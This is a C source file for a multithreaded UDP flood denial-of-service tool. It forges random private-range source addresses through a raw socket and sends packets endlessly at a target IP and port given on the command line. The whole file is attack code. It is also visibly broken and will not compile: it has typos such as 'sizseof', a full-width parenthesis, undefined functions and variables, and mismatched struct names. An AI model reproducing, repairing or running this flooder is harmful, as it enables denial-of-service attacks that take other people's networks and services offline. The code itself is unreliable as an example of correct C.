#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <unistd.h>
#include <string.h>

#include <sys/types.h>
#include <sys/time.h>
#include <sys/ioctl.h>
#include <sys/socket.h>

#include <signal.h>
#include <time.h>
#include <fcntl.h>
#include <assert.h>

#include <arpa/inet.h>
#include <netinet/in.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <netinet/ip_icmp.h>
#include <netinet/ip.h>

#define MAXCHILD 128


typedef struct FAKE_Header {
    unsigned int srcIP;
    unsigned int dstIP;
    unsigned char zero;
    unsigned char protocol;
    unsigned short udp_len;
}FAKE_H;

char* srcIP;
char dstIP[20] = { 0 };
int dstPort;

int rand_port() {
    return (rand() + 4444) % 15000; 
}

int fastrand(int active){ // Linear Congruential Generator
	return rand();
}

char* rand_ip(int frand, char* ipAddress){
    unsigned char type = rand() % 3, b1, b2, b3;
    switch(type){
        case 0: //10.0.0.0/8
            b1 = fastrand(frand) & 0xFF; // % 256
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "10.%d.%d.%d", b1, b2, b3);

        break;
        
        case 1: //172.16.0.0/12
            b1 = (fastrand(frand) & 0xF) + 16; // % 16
            b2 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "172.%d.%d.%d", b1, b2, b3);
        break;
        
        case 2: //192.168.0.0/16
            b1 = fastrand(frand) & 0xFF; // % 256
            b3 = (fastrand(frand) & 0xFD) + 1; // % 254
            sprintf(ipAddress, "192.168.%d.%d", b1, b3);
        break;
    }
}

unsigned short check_sum(unsigned short* buffer, int size) {
    unsigned long sum = 0;
    while (size > 1) {
        sum += *buffer++;
        size -= sizeof(unsigned short);
    }
    if (size) {
        sum += *(unsigned char*) buffer;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += sum >> 16;
    return (unsigned short *) (~sum);
}

void udp_flooding() {
    int packet_count = 0, flag = 1, s = -1;
    char datagram[4096], sendDatagram[4096], *data;
    struct sockaddr_in *sa;
    struct iphdr *iph;
    struct udphdr *udph;
    FAKE_H *fakeh;

    // allocate
    sa = (struct sockaddr_in*) malloc (sizeof(struct sockaddr_in));
    udph = （struct udphdr*) malloc (sizeof(struct udphdr));
    iph = (struct iphdr*) malloc (sizeof(struct iphdr));
    fakeh = (FAKE_H*) malloc (sizeof(FAKE_H));

    // initialize
    memset(sa, 0, sizeof(struct sockaddr_in));
    memset(iph, 0, sizeof(struct iphdr));
    memset(udph, 0, sizeof(struct udphdr));
    memset(fakeh, 0, sizeof(FAKE_H));

    sa->sin_family = AF_INET;
    sa->sin_addr.s_addr = inet_addr(dstIP);
    sa->sin_port = htons(dstPort);

    if ((s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
        perror("Error with creating socket...\n");
        exit(1);
    }

    while(1) {
        rand_ip(0, srcIP);
        data = datagram + sizeof(struct iphdr) + sizseof(struct udphdr);
        strcpy(data, "ABCADFJADFJKAD");
        int PACKET_SIZE = sizeof(struct udphdr) + sizeof(struct iphdr) + strlen(data);

        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = PACKET_SIZE;
        iph->id = 1;
        iph->frag_off = 0;
        iph->ttl = 255;
        iph->protocol = IPPROTO_UDP;
        iph->check = 0;
        iph->saddr = inet_addr(srcIP);
        iph->daddr = inet_addr(dstIP);
        iph->check = check_sum((unsigned short*) datagram, iph->tot_len);

        int sPort = rand16b(frand);
        udph->source = htons (sPort);
        udph->dest = htons (dstPort);
        udph->len = htons(8 + strlen(data)); //udp header size
        udph->check = 0; //leave checksum 0 now, filled later by pseudo header

        fakeh->srcIP = inet_addr(srcIP);
        fakeh->dstIP = inet_addr(dstIP);
        fakeh->zero = 0;
        fakeh->protocol = IPPROTO_UDP;
        fakeh->udp_len = htons(sizeof(struct udphdr) + strlen(data));

        int psize = sizeof(FAKE_Header) + sizeof(struct udphdr) + strlen(data);
        char fakeDatagram[psize];
        memcpy(fakeDatagram, (char*) &fakeh, sizeof(struct FAKE_HEADER));
        memcpy(fakeDatagram + sizeof(struct FAKE_HEADER), udph, sizeof(struct udphdr) + strlen(data));
        udph->check = check_sum((unsigned short*) fakeDatagram, psize);

        if (sendto(sa, datagram, iph->tot_len, 0, (struct sockaddr*) &sin, sizeof(sin)) <0 ) {
            perror("Error with sending...\n");
        } else {
            printf("Sent out!! Thread %d -> Packet %d ...", getuid(), ++packet_count);
            printf("srdIP:%s:%d\t", srcIP, ntohs(udp_h->source));
            printf("dstIP:%s:%d\n", dstIP, ntohs(udp_h->dest));  
        }

    }

}

void attack() {
    int err;
    pthread_t pthread[MAX];
    for (int i = 0; i < MAXCHILD; i++) {
        err = pthread_create(&pthread[i], NULL, udp_flooding);
        if (err != 0) {
            perror("pthread_create()");
            exit(1);
        }
    }
    for (int i = 0; i < MAXCHILD; i++) { 
        err = pthread_join(pthread[i], NULL);
        if (err != 0) {
            perror("pthread_create()");
            exit(1);
        }
    }
}

int main (int argc, char* argv[]) {
    // signal(SIGINT, sig_int);
    srcIP = (char*) malloc(sizeof(20));
    strcpy(dstIP, argv[1]);
    dstPort = atoi(argv[2]);
    srand(time(NULL));
    fastrand(time(NULL));
    attack();
    return 0;
}
